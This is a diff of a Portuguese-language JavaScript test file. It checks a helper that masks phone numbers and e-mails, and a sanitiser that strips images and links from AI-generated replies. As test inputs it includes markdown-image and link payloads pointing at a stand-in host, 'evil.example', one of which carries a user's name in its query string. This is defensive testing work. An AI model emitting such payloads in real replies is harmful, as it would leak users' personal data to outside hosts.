@@ -78,7 +78,11 @@ test('roteiro das 30 perguntas: o artigo certo está entre os 3 primeiros', () =
 test('privacidade e injeção: telefone e e-mail mascarados no texto livre; resposta sem imagem nem link', () => {
   assert.equal(mascarar('Ligar no 61 98888-7777 ou (61) 3333-4444, fulano@exemplo.com'), 'Ligar no [telefone] ou [telefone], [e-mail]');
   assert.equal(mascarar('Visita 2026-10-20 às 10h, R$ 2500000'), 'Visita 2026-10-20 às 10h, R$ 2500000', 'datas e preços ficam');
+  assert.equal(mascarar('Ligar 61 9 8888-7777, ou só 98888-7777, 988887777, +1 415 555 2671, fulano @ exemplo.com'), 'Ligar [telefone], ou só [telefone], [telefone], [telefone], [e-mail]');
+  assert.equal(mascarar('CEP 70000-000, R$ 1.250.000, 20/10/2026, IMV-123456'), 'CEP 70000-000, R$ 1.250.000, 20/10/2026, IMV-123456');
   assert.equal(respostaSegura('Oi ![x](https://evil.example/?d=Ana) e [clique](https://evil.example) <img src=x> veja https://evil.example/a'), 'Oi  e clique  veja [link removido]');
+  assert.equal(respostaSegura('Abra www.evil.example/login ou evil.example/x?d=Ana ou ftp://x.y/z'), 'Abra [link removido] ou [link removido] ou [link removido]');
+  assert.deepEqual(buscarArtigos('como apago um contato?', '/', 3).some((a) => a.slug === 'conta-e-ajustes'), false, 'contato não cai em Conta');
 });
 
 test('ações propostas pela IA: só valem as conferidas, com o resumo escrito pelo app', () => {
